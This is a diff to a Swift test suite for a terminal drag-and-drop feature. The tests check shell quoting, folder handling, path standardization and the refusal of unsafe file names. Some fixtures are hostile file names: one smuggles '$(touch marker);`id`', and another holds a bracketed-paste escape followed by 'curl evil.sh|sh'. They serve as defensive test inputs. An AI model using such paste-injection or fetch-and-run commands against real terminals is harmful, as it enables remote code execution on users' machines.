@@ -23,9 +23,12 @@ struct TerminalDropTests {
                 == "'/tmp/my photo.png' /tmp/other.png")
         #expect(TerminalDrop.pasteText(for: ["/tmp/a;b.png"]) == "'/tmp/a;b.png'")
         #expect(TerminalDrop.pasteText(for: ["/tmp/a&b.png"]) == "'/tmp/a&b.png'")
+        #expect(TerminalDrop.pasteText(for: ["/tmp/owner's folder"]) == "'/tmp/owner'\\''s folder'")
+        #expect(TerminalDrop.pasteText(for: ["/tmp/$(touch marker);`id`"]) == "'/tmp/$(touch marker);`id`'")
+        #expect(TerminalDrop.pasteText(for: ["/tmp/-album"]) == "/tmp/-album")
     }
 
-    @Test func filesToPasteSkipDirectoriesAndCapTheCount() throws {
+    @Test func filesToPasteKeepDirectoriesAndCapMixedItemsInOrder() throws {
         let root = FileManager.default.temporaryDirectory.appendingPathComponent(
             "sigil-drop-\(UUID().uuidString)", isDirectory: true)
         try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
@@ -39,18 +42,44 @@ struct TerminalDropTests {
         try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
 
         let kept = TerminalDrop.filesToPaste(from: [folder, photo, notes])
-        #expect(kept == [photo, notes])
+        #expect(kept == [folder, photo, notes].map(\.standardizedFileURL))
 
         let many = (0..<TerminalDrop.maxFiles + 3).map { index in
-            root.appendingPathComponent("f\(index).txt")
+            root.appendingPathComponent("f\(index).\(index % 2 == 0 ? "folder" : "png")")
         }
-        for url in many {
-            try Data("x".utf8).write(to: url)
+        for (index, url) in many.enumerated() {
+            if index % 2 == 0 {
+                try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
+            } else {
+                try Data("x".utf8).write(to: url)
+            }
         }
-        #expect(TerminalDrop.filesToPaste(from: many).count == TerminalDrop.maxFiles)
+        #expect(
+            TerminalDrop.filesToPaste(from: many)
+                == many.prefix(TerminalDrop.maxFiles).map(\.standardizedFileURL))
     }
 
-    @Test func filesWithControlCharactersInTheirNameAreRefused() throws {
+    @Test func folderPathsAreStandardizedWithoutResolvingTheNamedSymlink() throws {
+        let root = FileManager.default.temporaryDirectory.appendingPathComponent(
+            "sigil-drop-\(UUID().uuidString)", isDirectory: true
+        ).standardizedFileURL
+        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: root) }
+        let folder = root.appendingPathComponent("album", isDirectory: true)
+        let link = root.appendingPathComponent("folder link", isDirectory: true)
+        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: folder)
+        let redundant = URL(fileURLWithPath: root.path + "/./album/../album", isDirectory: true)
+        let missing = root.appendingPathComponent("missing")
+
+        let paths = TerminalDrop.filesToPaste(from: [redundant, missing, link]).map(\.path)
+        #expect(paths == [folder.path, link.path])
+        #expect(paths.allSatisfy { $0.hasPrefix("/") })
+        #expect(link.path != link.resolvingSymlinksInPath().path)
+    }
+
+    @Test(arguments: [false, true])
+    func filesAndFoldersWithControlCharactersInTheirNameAreRefused(isDirectory: Bool) throws {
         let root = FileManager.default.temporaryDirectory.appendingPathComponent(
             "sigil-drop-\(UUID().uuidString)", isDirectory: true)
         try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
@@ -59,15 +88,23 @@ struct TerminalDropTests {
         let safe = root.appendingPathComponent("shot.png")
         let hostile = root.appendingPathComponent("shot.png\u{1b}[201~\u{15}curl evil.sh|sh\r")
         let newline = root.appendingPathComponent("a\nb.txt")
+        let tab = root.appendingPathComponent("a\tb.txt")
+        let delete = root.appendingPathComponent("a\u{7f}b.txt")
         let c1 = root.appendingPathComponent("a\u{9b}b.txt")
-        for url in [safe, hostile, newline, c1] {
-            try Data("x".utf8).write(to: url)
+        for url in [safe, hostile, newline, tab, delete, c1] {
+            if isDirectory {
+                try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
+            } else {
+                try Data("x".utf8).write(to: url)
+            }
         }
 
         #expect(TerminalDrop.isSafeToPaste(safe.path))
         #expect(TerminalDrop.isSafeToPaste("/tmp/my photo \u{1F4F7}.png"))
         #expect(!TerminalDrop.isSafeToPaste(hostile.path))
-        #expect(TerminalDrop.filesToPaste(from: [hostile, safe, newline, c1]) == [safe])
+        #expect(
+            TerminalDrop.filesToPaste(from: [hostile, safe, newline, tab, delete, c1])
+                == [safe.standardizedFileURL])
         #expect(TerminalDrop.hasUnsafeFileName([safe, hostile]))
         #expect(!TerminalDrop.hasUnsafeFileName([safe]))
 
